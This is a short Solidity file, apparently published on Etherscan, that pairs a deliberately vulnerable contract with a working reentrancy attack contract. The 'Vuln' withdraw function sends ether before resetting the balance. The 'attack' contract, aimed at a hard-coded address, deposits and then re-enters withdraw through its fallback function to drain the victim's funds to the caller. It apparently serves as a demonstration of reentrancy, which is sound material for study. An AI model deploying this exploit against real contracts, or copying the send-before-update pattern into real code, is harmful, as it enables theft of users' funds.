/**
 *Submitted for verification at Etherscan.io on 2021-05-01
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {
    Vuln objct = Vuln(address(0xd9145CCE52D386f254917e481eB44e9943F39138));


    function attk() public payable {
    objct.deposit.value(msg.value)();
    objct.withdraw();
    msg.sender.transfer(address(this).balance);
    }

    function () external payable {
    objct.withdraw();
    }

}